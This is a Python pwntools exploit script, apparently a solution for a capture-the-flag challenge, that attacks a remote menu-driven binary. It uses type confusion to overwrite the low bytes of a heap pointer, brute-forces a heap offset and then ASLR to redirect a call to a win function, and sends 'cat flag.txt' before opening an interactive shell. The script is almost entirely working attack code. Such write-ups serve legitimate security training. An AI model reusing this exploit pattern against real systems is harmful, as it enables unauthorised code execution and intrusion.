#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe

gdbscript = """
# b *create_variable+314 # string read
# b *create_variable+454 # char scanf
# b *create_variable+521 # long long scanf
continue
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=gdbscript)
    else:
        r = remote("host.cg21.metaproblems.com", 3150)

    return r

def create_string(r, size, data):
    r.sendlineafter(b'Exit\n', b'1') # action: create
    r.sendlineafter(b'Character\n', b'1') # type: string
    r.sendlineafter(b'to be\n', str(size).encode()) # length
    r.sendlineafter(b'data\n', data) # data

def create_long(r, num):
    r.sendlineafter(b'Exit\n', b'1') # action: create
    r.sendlineafter(b'Character\n', b'3') # type: long long
    r.sendlineafter(b'value:\n', str(num).encode()) # data

def display_objects(r):
    r.sendlineafter(b'Exit\n', b'2') # action: display
    try:
        res = r.recvuntil(b'What', drop=True)
        return res.split(b'\n')
    except:
        return []

def edit_as_string(r, idx, size, data):
    r.sendlineafter(b'Exit\n', b'3') # action: create
    r.sendlineafter(b'modify?\n', str(idx).encode()) # modify index (starts at 0)
    r.sendlineafter(b'Character\n', b'1') # type: long long
    r.sendlineafter(b'to be\n', str(size).encode()) # length
    r.sendlineafter(b'data\n', data)

def edit_as_char(r, idx, char):
    r.sendlineafter(b'Exit\n', b'3') # action: create
    r.sendlineafter(b'modify?\n', str(idx).encode()) # modify index (starts at 0)
    r.sendlineafter(b'Character\n', b'4') # type: char
    r.sendlineafter(b'value:\n', bytes([char])) # send char as bytes

def brute_force_aslr(offset):
    while True:
        r = conn()

        # we want to mimick the same conditions as brute_force_offset to preserve offsets
        create_long(r, 7)
        create_string(r, 1, b'A')
        create_long(r, 7)

        # bottom 12 bits of win address is 0x680
        # modifying lowest byte to be 0x80
        edit_as_char(r, 1, offset+0x8)
        edit_as_string(r, 1, 1, b'\x80')

        # modifying second lowest byte to be 0x06
        # we have to guess the highest 4 bits (here we guess 0)
        edit_as_char(r, 1, offset+0x8+1)
        edit_as_string(r, 1, 1, b'\x06')

        # display should call win if successful
        r.sendlineafter(b'Exit\n', b'2')

        try:
            r.sendline(b'cat flag.txt')
            # this recvline will fail if the display errors
            res = r.recvline()
            if b'Segmentation fault' in res:
                raise Exception()
            print(res)
            r.interactive()
            break
        except:
            # keep on trying until we break ASLR
            print('failed')
            r.close()

def brute_force_offset():
    for offset in range(0x0, 0x100, 0x8):
        if offset == 0x20:
            # ignore space because sscanf has issues with it
            continue
        print('Trying offset:', hex(offset))

        r = conn()

        # allocate two chunks on the heap so we can detect either one
        create_long(r, 7)
        create_string(r, 1, b'A')
        create_long(r, 7)

        # overwrite the lowest byte of the heap pointer
        edit_as_char(r, 1, offset)
        edit_as_string(r, 1, 1, b'\x06')

        vals = display_objects(r)
        print(vals)
        if len(vals) == 4 and (vals[0] == b'6' or vals[2] == b'6'):
            # if either of the chunks change their value to 6, then we have succeeded in finding an offset
            print('=' * 80)
            print('SUCCESS at offset:', hex(offset))
            print('=' * 80)

        r.close()

def main():
    # note: first run brute_force_offset to get the offset, then run brute_force_aslr

    # server offset: 0xe8, 0x68
    # local offset: 0x28
    # brute_force_offset()

    brute_force_aslr(offset=0x68)

if __name__ == "__main__":
    main()
